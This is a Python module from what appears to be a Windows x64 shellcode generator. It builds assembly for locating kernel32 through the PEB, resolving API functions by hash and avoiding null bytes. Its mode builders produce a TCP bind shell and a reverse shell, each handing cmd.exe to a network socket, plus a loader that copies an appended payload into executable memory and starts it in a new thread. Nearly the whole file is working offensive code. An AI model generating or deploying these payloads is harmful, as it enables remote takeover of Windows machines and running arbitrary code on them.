"""
x64 assembly block builders and high-level mode builders.

All assembly targets Microsoft x64 ABI:
  - First four integer args: RCX, RDX, R8, R9
  - 32-byte shadow space required below args before every CALL
  - 16-byte RSP alignment required before every CALL
  - No pushad/popad — registers saved/restored individually
  - RIP-relative addressing available for position independence
"""

import struct

from shellcode.hashing  import compute_hash
from shellcode.encoding import stack_string_pushes
from .slots             import SlotAllocator64
from .snippets import (
    SNIPPET_STARTUPINFOA_SOCKET,
    SNIPPET_CMD_STRING,
    snippet_createprocessa,
    snippet_terminateprocess,
    snippet_wsa_init,
    snippet_wsa_socket_tcp,
    snippet_sockaddr_bind,
    snippet_bind_listen_accept,
    snippet_wsaconnect,
)


# ── Static core blocks ─────────────────────────────────────────────────────────

_PROLOGUE = """\
start:
    and   rsp, 0xfffffffffffffff0    ; align RSP to 16-byte boundary (48 83 E4 F0, no nulls)
    mov   rbp, rsp                   ; RBP = frame base; slots live at [rbp-N]
    sub   rsp, 0x80                  ; reserve 128 bytes: slots [rbp-0x08..rbp-0x78] + working room"""

# GS:[0x60] → PEB (x64). All structure offsets differ from x86:
#   PEB  + 0x18  → Ldr  (was 0x0C)
#   Ldr  + 0x30  → InInitializationOrderModuleList.Flink  (was 0x1C)
#   flink+ 0x20  → DllBase  (was 0x08; because InInitOrder links sit at
#                            LDR_DATA_TABLE_ENTRY+0x10, DllBase at +0x30 → delta 0x20)
#   flink+ 0x50  → BaseDllName.Buffer  (UNICODE_STRING at +0x58, Buffer ptr at +0x08
#                            within it → 0x58-0x10+0x08 = 0x50 from flink ptr)
#   kernel32.dll is 12 characters — same length check as x86, still uses CX
_FIND_KERNEL32 = """\
find_kernel32:
    xor   rcx, rcx                   ; RCX = 0
    mov   rsi, gs:[rcx+0x60]         ; RSI = PEB  (GS:0x60, not FS:0x30)
    mov   rsi, [rsi+0x18]            ; RSI = PEB->Ldr
    mov   rsi, [rsi+0x30]            ; RSI = Ldr.InInitializationOrderModuleList.Flink
next_module:
    mov   rbx, [rsi+0x20]            ; RBX = DllBase (module base address)
    mov   rdi, [rsi+0x50]            ; RDI = BaseDllName.Buffer (unicode ptr)
    mov   rsi, [rsi]                 ; RSI = Flink (next entry)
    cmp   [rdi+12*2], cx             ; modulename[12] == 0? (kernel32.dll = 12 chars)
    jne   next_module                ; keep walking"""

# Call/pop thunk — position-independent way to capture find_function's runtime address.
# Works identically to x86 but uses 64-bit registers.
# The CALL pushes an 8-byte return address (address of find_function_ret);
# POP RSI retrieves it.  That address IS find_function, so we save it to
# [rbp-0x08] (the reserved find_function slot).
_FIND_FUNCTION_THUNK = """\
find_function_shorten:
    jmp   find_function_shorten_bnc
find_function_ret:
    pop   rsi                        ; RSI = runtime address of find_function
    mov   [rbp-0x08], rsi            ; save to reserved slot [rbp-0x08]
    jmp   resolve_symbols_kernel32
find_function_shorten_bnc:
    call  find_function_ret          ; CALL pushes find_function addr; negative offset"""


def _find_function_asm(algo: str, rotation: int) -> str:
    """
    x64 export-name resolver.

    Differences from x86 version:
      - No pushad/popad — R8–R11 (volatile) saved/restored manually
      - Hash to find is passed in RCX (fastcall first arg), not pushed on stack
      - Uses 64-bit registers throughout; RVAs still 32-bit (PE format unchanged)
      - CALL from caller must include 32-byte shadow space (handled by caller)

    Register contract on entry:
      RBX = DLL base address to search
      RCX = target hash

    Register contract on return:
      RAX = resolved function VMA  (0 if not found)
      All non-volatile registers preserved (RBX, RBP, RDI, RSI, R12–R15)
    """
    if algo == 'ror':
        hash_ops = (
            f'    ror   edx, {hex(rotation):<8}       ; ROR-{rotation}\n'
            f'    add   edx, eax                   ; accumulate byte'
        )
    else:
        hash_ops = (
            f'    rol   edx, {hex(rotation):<8}       ; ROL-{rotation}\n'
            f'    xor   edx, eax                   ; XOR byte in'
        )

    return """\
find_function:
    ; Save volatile registers we will use (R8–R11 are caller-saved in ABI but
    ; we save them anyway so find_function is safe to call from any context)
    push  rsi
    push  rdi
    push  r8
    push  r9
    sub   rsp, 0x28                  ; shadow space + 16-byte alignment

    ; RCX = target hash (fastcall arg1) — save it before we clobber RCX
    mov   r9,  rcx                   ; R9  = target hash (saved copy)
    xor   rax, rax                   ; RAX = 0 (default: not found)

    ; Parse PE export directory from DLL at RBX
    mov   eax, [rbx+0x3c]           ; e_lfanew (32-bit RVA)
    mov   edi, [rbx+rax+0x78]       ; Export Table RVA (32-bit)
    add   rdi, rbx                   ; Export Table VMA
    mov   ecx, [rdi+0x18]           ; NumberOfNames
    mov   r8d, [rdi+0x20]           ; AddressOfNames RVA
    add   r8,  rbx                   ; AddressOfNames VMA
find_function_loop:
    test  ecx, ecx
    jz    find_function_finished     ; ECX == 0: not found
    dec   ecx
    mov   esi, [r8+rcx*4]           ; export name RVA
    add   rsi, rbx                   ; export name VMA
compute_hash:
    xor   eax, eax                   ; EAX = current byte
    xor   edx, edx                   ; EDX = running hash
    cld
compute_hash_again:
    lodsb                            ; AL = *RSI++
    test  al, al
    jz    compute_hash_finished
""" + hash_ops + """
    jmp   compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp   edx, r9d                   ; computed hash vs target hash
    jnz   find_function_loop
    ; Match — resolve VMA from ordinal
    mov   edx, [rdi+0x24]           ; AddressOfNameOrdinals RVA
    add   rdx, rbx                   ; VMA
    movzx ecx, word ptr [rdx+rcx*2] ; ordinal for this name index
    mov   edx, [rdi+0x1c]           ; AddressOfFunctions RVA
    add   rdx, rbx                   ; VMA
    mov   eax, [rdx+rcx*4]          ; function RVA
    add   rax, rbx                   ; function VMA  ← return value
find_function_finished:
    add   rsp, 0x28                  ; restore shadow space
    pop   r9
    pop   r8
    pop   rdi
    pop   rsi
    ret"""


# ── String builder for x64 stack ───────────────────────────────────────────────

def _x64_stack_string(s: str) -> tuple:
    """
    Emit x64 instructions that build null-terminated ASCII *s* on the stack.

    Strategy: sub rsp, N  (16-byte aligned allocation)
               mov dword ptr [rsp+i], chunk   for each 4-byte chunk
               lea rcx, [rsp]                 pointer to string in RCX

    Null bytes in chunk immediates are avoided by building the value in EAX
    first using xor/mov, then storing EAX to memory (the store instruction
    itself never contains null bytes).

    Returns (asm_str, alloc_size) where alloc_size is the bytes subtracted
    from RSP.  The caller must add alloc_size back to RSP after use.
    """
    data  = s.encode('ascii') + b'\x00'
    alloc = ((len(data) + 15) // 16) * 16      # round up to 16-byte multiple
    lines = [f'    sub   rsp, {hex(alloc):<8}                 ; space for "{s}"']

    for i in range(0, len(data), 4):
        chunk = data[i:i+4].ljust(4, b'\x00')
        val   = struct.unpack('<I', chunk)[0]
        label = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        nulls = [j for j, b in enumerate(chunk) if b == 0]

        if not nulls:
            # No nulls — immediate is safe to use directly
            lines.append(
                f'    mov   dword ptr [rsp+{hex(i)}], {hex(val):<10}  ; "{label}"')
        elif val == 0:
            # All-null chunk — write a zero dword via register
            lines += [
                '    xor   eax, eax',
                f'    mov   dword ptr [rsp+{hex(i)}], eax             ; "{label}"']
        elif nulls == [2, 3]:
            word = struct.unpack('<H', chunk[:2])[0]
            lines += [
                '    xor   eax, eax',
                f'    mov   ax, {hex(word):<10}                        ; "{label}"',
                f'    mov   dword ptr [rsp+{hex(i)}], eax']
        elif nulls == [1, 2, 3]:
            lines += [
                '    xor   eax, eax',
                f'    mov   al, {hex(chunk[0]):<10}                    ; "{label}"',
                f'    mov   dword ptr [rsp+{hex(i)}], eax']
        elif nulls == [3]:
            lines += [
                '    xor   eax, eax',
                f'    mov   al, {hex(chunk[2])}',
                '    shl   eax, 0x08',
                f'    mov   al, {hex(chunk[1])}',
                '    shl   eax, 0x08',
                f'    mov   al, {hex(chunk[0])}                        ; "{label}"',
                f'    mov   dword ptr [rsp+{hex(i)}], eax']
        else:
            lines += [
                f'    ; WARNING: embedded null in chunk "{label}" — manual fix required',
                f'    mov   dword ptr [rsp+{hex(i)}], {hex(val):<10}  ; "{label}"']

    return '\n'.join(lines), alloc


# ── Resolve block builders ─────────────────────────────────────────────────────

def build_resolve_block(func_names: list, algo: str, rotation: int,
                        slots: SlotAllocator64,
                        label: str = 'resolve_symbols_kernel32') -> str:
    """
    Emit MOV RCX / CALL / MOV [slot] triplets for each function name.

    x64 calling convention:
      - Hash passed in RCX (first fastcall arg)
      - `mov ecx, hash` zero-extends to RCX — correct because hashes are 32-bit
      - find_function called via [rbp-0x08] (reserved slot)
      - Result (function VMA) returned in RAX
      - Saved as QWORD to the allocated slot

    RBX must equal the target DLL base on entry.
    Slots are allocated in *slots* as a side effect.
    """
    lines = [f'{label}:']
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    mov   ecx, {hex(h):<14}         ; {name} hash',
            f'    call  qword ptr [rbp-0x08]       ; find_function(rcx=hash, rbx=dll_base)',
            f'    mov   qword ptr [{slots.asm_slot(name)}], rax  ; save {name}',
        ]
    return '\n'.join(lines)


def build_load_and_resolve(dll: str, func_names: list, algo: str,
                            rotation: int, slots: SlotAllocator64) -> str:
    """
    Load *dll* via LoadLibraryA then resolve *func_names* from it.

    LoadLibraryA must already be allocated in *slots*.

    String layout on the x64 stack (sub rsp + dword MOVs, null-byte safe):
        sub  rsp, alloc         ; space for dll name
        mov  dword ptr [rsp+N]  ; write chunks
        lea  rcx, [rsp]         ; RCX = ptr to dll name  (fastcall arg1)
        sub  rsp, 0x20          ; shadow space for the call
        call LoadLibraryA
        add  rsp, alloc+0x20    ; reclaim string + shadow space
        mov  rbx, rax           ; RBX = new DLL base for find_function
    """
    tag      = dll.replace('.', '_').replace('-', '_')
    la_slot  = slots.asm_slot('LoadLibraryA')
    str_asm, str_alloc = _x64_stack_string(dll)
    cleanup  = str_alloc + 0x20          # string space + shadow space

    lines = [f'load_{tag}:']
    lines.append(str_asm)
    lines += [
        f'    lea   rcx, [rsp]                 ; RCX = ptr to "{dll}"',
        f'    sub   rsp, 0x20                  ; shadow space for LoadLibraryA',
        f'    call  qword ptr [{la_slot}]       ; LoadLibraryA("{dll}") -> RAX = DLL base',
        f'    add   rsp, {hex(cleanup):<8}                 ; restore shadow + string space',
        f'resolve_{tag}:',
        f'    mov   rbx, rax                   ; RBX = {dll} base for find_function',
    ]
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    mov   ecx, {hex(h):<14}         ; {name} hash',
            f'    call  qword ptr [rbp-0x08]       ; find_function',
            f'    mov   qword ptr [{slots.asm_slot(name)}], rax  ; save {name}',
        ]
    return '\n'.join(lines)


def build_call_placeholder(func_names: list, slots: SlotAllocator64) -> str:
    """
    Emit a commented call_function placeholder listing all resolved slots.
    The first name in *func_names* is the default call target.
    """
    slot_comments = '\n'.join(
        f'    ; [{slots.asm_slot(n)}] = {n}' for n in func_names
    )
    primary = func_names[0]
    return (
        'call_function:\n'
        f'{slot_comments}\n'
        '    ; Set up RCX/RDX/R8/R9 for your chosen function, then:\n'
        f'    sub   rsp, 0x20                  ; shadow space\n'
        f'    call  qword ptr [{slots.asm_slot(primary)}]    ; {primary}\n'
        f'    add   rsp, 0x20'
    )


# ── Mode builders ──────────────────────────────────────────────────────────────

def custom_code(func_names: list, algo: str = 'ror', rotation: int = 13):
    """
    Resolve *func_names* from kernel32 and emit a call_function placeholder.

    All names must exist in kernel32.dll's export table.  For functions from
    other DLLs use bindshell_code / revshell_code as a template and call
    build_load_and_resolve manually.

    Returns (asm_string, SlotAllocator64).
    """
    slots    = SlotAllocator64()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(func_names, algo, rotation, slots),
        build_call_placeholder(func_names, slots),
    ]
    return '\n'.join(sections), slots


def bindshell_code(port: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP bind shell on *port*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, bind, listen, accept
      WSAStartup → WSASocketA → sockaddr_in → bind → listen → accept
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Register conventions maintained across snippets:
      RSI  socket handle (set by snippet_wsa_socket_tcp / accept)
      RDI  &STARTUPINFOA (set by SNIPPET_STARTUPINFOA_SOCKET)
      RBX  "cmd.exe" pointer (set by SNIPPET_CMD_STRING)

    Returns (asm_string, SlotAllocator64).
    """
    slots    = SlotAllocator64()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'bind', 'listen', 'accept'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_sockaddr_bind(port),
        snippet_bind_listen_accept(
            slots.slot('bind'), slots.slot('listen'), slots.slot('accept')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots


def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP reverse shell connecting to *lhost*:*lport*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, WSAConnect
      WSAStartup → WSASocketA → WSAConnect(lhost:lport)
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Register conventions maintained across snippets:
      RSI  socket handle (set by snippet_wsa_socket_tcp)
      RDI  &STARTUPINFOA (set by SNIPPET_STARTUPINFOA_SOCKET)
      RBX  "cmd.exe" pointer (set by SNIPPET_CMD_STRING)

    Returns (asm_string, SlotAllocator64).
    """
    slots    = SlotAllocator64()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'WSAConnect'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_wsaconnect(lhost, lport, slots.slot('WSAConnect')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots


# ── PI loader ──────────────────────────────────────────────────────────────────

# `add rax, imm32` placeholder — LE bytes EF BE F1 7E, no null bytes.
# Forces a stable 6-byte encoding (REX.W 05 + imm32) so the instruction size
# is the same before and after patching with the real delta.
_LOADER_DELTA_PLACEHOLDER_64 = 0x7EF1BEEF


def _build_in_eax(val: int, comment: str = '') -> list:
    """
    Return a list of assembly lines that load *val* (32-bit) into EAX
    without embedding null bytes in any instruction encoding.

    EAX being 32-bit means the upper 32 bits of RAX are zeroed too — safe
    for use as any DWORD-width argument moved into a 64-bit register afterwards.
    """
    packed = struct.pack('<I', val & 0xFFFFFFFF)
    b      = list(packed)
    c      = f'  ; {comment}' if comment else ''
    nulls  = [i for i, x in enumerate(b) if x == 0]

    if val == 0:
        return [f'    xor   eax, eax{c}']
    if not nulls:
        return [f'    mov   eax, {hex(val)}{c}']

    lines = ['    xor   eax, eax']
    if nulls == [1, 2, 3]:
        lines.append(f'    mov   al, {hex(b[0])}{c}')
    elif nulls == [2, 3]:
        lines.append(f'    mov   ax, {hex(b[0] | b[1] << 8)}{c}')
    elif nulls == [3]:
        lines += [
            f'    mov   al, {hex(b[2])}',
            '    shl   eax, 0x08',
            f'    mov   al, {hex(b[1])}',
            '    shl   eax, 0x08',
            f'    mov   al, {hex(b[0])}{c}',
        ]
    else:
        lines = [
            f'    ; WARNING: embedded null in {hex(val)} ({comment}) — may need encoder',
            f'    mov   eax, {hex(val)}{c}',
        ]
    return lines


def loader_code(payload: bytes, algo: str = 'ror', rotation: int = 13):
    """
    Build a position-independent x64 shellcode loader with *payload* appended.

    Layout of the returned blob:
        [ loader shellcode ][ payload bytes ]

    The loader at runtime:
      1. Walks the PEB (GS:[0x60]) to find kernel32.dll
      2. Resolves VirtualAlloc, RtlMoveMemory, CreateThread, WaitForSingleObject
      3. Locates the appended payload via a call/pop delta (position-independent)
      4. VirtualAlloc(RWX) → RtlMoveMemory(payload) → CreateThread → WaitForSingleObject

    Callee-saved registers R12/R13/R14 are used to preserve the payload pointer,
    the RWX buffer address, and the thread handle across API calls — no explicit
    push/pop needed since Win64 ABI guarantees callees preserve R12-R15.

    The call/pop delta uses the same one-pass assemble-then-patch strategy as
    the x86 loader_code:
      - Assemble with placeholder 0x7EF1BEEF in `add rax, imm32`
      - Locate the marker bytes in the output
      - Patch them with the real delta (loader_size - offset_of_pop_rax)
      - Append the raw payload bytes

    Note: after patching, the delta imm32 may contain null bytes if the loader
    size is a multiple of 256 etc.  Run through an encoder if null-free output
    is required.

    Returns (loader_blob: bytes, slots: SlotAllocator64).
    """
    slots        = SlotAllocator64()
    payload_size = len(payload)

    resolve_block = build_resolve_block(
        ['VirtualAlloc', 'RtlMoveMemory', 'CreateThread', 'WaitForSingleObject'],
        algo, rotation, slots,
    )

    va_asm  = slots.asm_slot('VirtualAlloc')
    rtl_asm = slots.asm_slot('RtlMoveMemory')
    ct_asm  = slots.asm_slot('CreateThread')
    wso_asm = slots.asm_slot('WaitForSingleObject')

    # ── payload_size into EAX (null-byte safe), then MOV into target reg ───────
    size_into_rdx = '\n'.join(_build_in_eax(payload_size, 'dwSize = payload size') +
                               ['    mov   rdx, rax'])
    size_into_r8  = '\n'.join(_build_in_eax(payload_size, 'Length = payload size') +
                               ['    mov   r8, rax'])

    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        resolve_block,

        # ── call/pop delta — RAX (→ R12) = payload address ───────────────────
        # After `pop rax`, RAX = runtime address of _get_here label (the pop itself).
        # `add rax, DELTA` advances RAX to the first byte of the appended payload.
        # DELTA = loader_size - offset(_get_here).  Patched after assembly.
        # R12 is callee-saved — survives VirtualAlloc, RtlMoveMemory, CreateThread.
        f"""\
find_payload:
    call  _get_here
_get_here:
    pop   rax                        ; RAX = runtime addr of this label
    add   rax, {hex(_LOADER_DELTA_PLACEHOLDER_64)}  ; PATCHED: delta → payload start
    mov   r12, rax                   ; R12 = payload ptr (callee-saved)""",

        # ── VirtualAlloc(NULL, payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        # 0x3000 built null-safely: xor + byte + shl.
        # 0x40 via push imm8 / pop r9 (6A 40 / 41 59 — no nulls).
        f"""\
call_virtualalloc:
    xor   rcx, rcx                   ; lpAddress = NULL
{size_into_rdx}
    xor   r8d, r8d                   ; \\
    mov   r8b, 0x30                  ;  > R8 = 0x3000 (MEM_COMMIT|MEM_RESERVE)
    shl   r8, 8                      ; /
    push  0x40                       ; \\
    pop   r9                         ; /  R9 = 0x40 (PAGE_EXECUTE_READWRITE)
    sub   rsp, 0x20                  ; shadow space
    call  qword ptr [{va_asm}]       ; VirtualAlloc -> RAX = RWX buffer
    add   rsp, 0x20
    mov   r13, rax                   ; R13 = RWX buffer (callee-saved)""",

        # ── RtlMoveMemory(RWX_buffer, payload_ptr, payload_size)
        f"""\
call_rtlmovememory:
    mov   rcx, r13                   ; Destination = RWX buffer
    mov   rdx, r12                   ; Source      = payload ptr
{size_into_r8}
    sub   rsp, 0x20                  ; shadow space
    call  qword ptr [{rtl_asm}]      ; RtlMoveMemory
    add   rsp, 0x20""",

        # ── CreateThread(NULL, 0, RWX_buffer, NULL, 0, NULL)
        # dwCreationFlags (5th arg) and lpThreadId (6th arg) go at [rsp+0x20/+0x28].
        # sub rsp, 0x30 = shadow (0x20) + two stack slots (0x10).
        f"""\
call_createthread:
    xor   rcx, rcx                   ; lpThreadAttributes = NULL
    xor   rdx, rdx                   ; dwStackSize = 0
    mov   r8, r13                    ; lpStartAddress = RWX buffer
    xor   r9, r9                     ; lpParameter = NULL
    xor   rax, rax
    sub   rsp, 0x30                  ; shadow (0x20) + dwCreationFlags + lpThreadId
    mov   [rsp+0x20], rax            ; dwCreationFlags = 0
    mov   [rsp+0x28], rax            ; lpThreadId = NULL
    call  qword ptr [{ct_asm}]       ; CreateThread -> RAX = thread handle
    add   rsp, 0x30
    mov   r14, rax                   ; R14 = thread handle (callee-saved)""",

        # ── WaitForSingleObject(thread_handle, INFINITE)
        # INFINITE = 0xFFFFFFFF.  `xor edx,edx / dec edx` gives EDX = 0xFFFFFFFF
        # (32-bit wrap), zero-extended to RDX.  No null bytes in either instruction.
        f"""\
call_waitforsingleobject:
    mov   rcx, r14                   ; hHandle = thread handle
    xor   edx, edx
    dec   edx                        ; EDX = 0xFFFFFFFF = INFINITE
    sub   rsp, 0x20                  ; shadow space
    call  qword ptr [{wso_asm}]      ; WaitForSingleObject
    add   rsp, 0x20""",
    ]

    code = '\n'.join(sections)

    # ── Assemble and patch ─────────────────────────────────────────────────────
    from .assembler import assemble64 as _asm
    loader_bytes = bytearray(_asm(code)[0])
    loader_size  = len(loader_bytes)

    # `add rax, 0x7EF1BEEF` → REX.W + 05 + LE(placeholder) = 48 05 EF BE F1 7E
    marker = b'\x48\x05' + struct.pack('<I', _LOADER_DELTA_PLACEHOLDER_64)
    pos    = loader_bytes.find(marker)
    if pos == -1:
        raise RuntimeError(
            'Loader delta placeholder not found in assembled output. '
            'Keystone may have optimised away the add instruction.'
        )

    # `pop rax` (58) is the single byte at pos-1.
    # After pop, RAX = loader_base + (pos - 1).
    # Payload starts at loader_base + loader_size.
    # → delta = loader_size - (pos - 1) = loader_size - pos + 1
    delta = loader_size - pos + 1
    loader_bytes[pos + 2 : pos + 6] = struct.pack('<I', delta)

    return bytes(loader_bytes) + bytes(payload), slots
